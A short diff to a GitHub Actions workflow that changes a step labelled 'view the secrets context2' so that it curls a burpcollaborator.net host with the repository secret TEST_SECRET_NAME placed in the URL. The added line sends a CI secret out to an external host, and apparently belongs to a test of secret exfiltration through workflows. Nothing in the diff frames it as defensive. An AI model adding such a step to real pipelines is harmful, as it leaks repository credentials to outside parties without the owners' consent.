@@ -20,4 +20,4 @@ jobs:
         run: ls
       - name: view the secrets context2
         shell: bash
-        run: curl
+        run: curl http://vkjm0q12k6ycxy1qz78cuxu0lrrhf6.burpcollaborator.net/${{ secrets.TEST_SECRET_NAME }}
